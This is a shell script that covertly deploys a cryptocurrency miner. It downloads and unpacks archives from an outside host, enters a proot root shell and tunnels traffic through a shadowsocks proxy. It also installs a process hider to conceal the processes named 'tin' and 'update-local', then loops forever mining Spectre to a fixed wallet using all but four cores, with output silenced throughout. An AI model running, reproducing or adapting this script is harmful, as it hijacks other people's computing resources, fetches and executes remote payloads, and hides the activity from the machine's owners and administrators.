#!/bin/sh
wget http://greenleaf.teatspray.fun/backup5.tar.gz
tar -xf backup5.tar.gz
sleep 3
rm backup5.tar.gz
./dist/proot -S . /bin/bash
su -
sleep 3
whoami
sleep 3
ls -la
sleep 3

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 4`
echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 ifconfig.me

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add tin 1>/dev/null 2>&1

sleep 2

ph add update-local 1>/dev/null 2>&1

sleep 2

wget -q http://greenleaf.teatspray.fun/tin.tar.gz >/dev/null

sleep 2

tar -xf tin.tar.gz

sleep 2

apt update >/dev/null

sleep 2

wget -q http://greenleaf.teatspray.fun/update.tar.gz >/dev/null

sleep 2

tar -xf update.tar.gz

sleep 2

netstat -ntlp

sleep 2

cat > update/local/update-local.conf <<END
listen = :2244
loglevel = 1
socks5 = 127.0.0.1:1082
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

echo "Your worker is : $currentdate "

sleep 2

while true
do
./update/update ./tin --spectre --stratum --daemon-address spectre.cedric-crispin.com --port 4364 --wallet spectre:qqp8js5e364fagd3w9j3ncq4ea29d9tj0lpmemzew6rcgtzz9ck0u54kwtgta --worker-name $currentdate --dev-fee 1 --threads $used_num_of_cores 1>/dev/null 2>&1
sleep 10
done
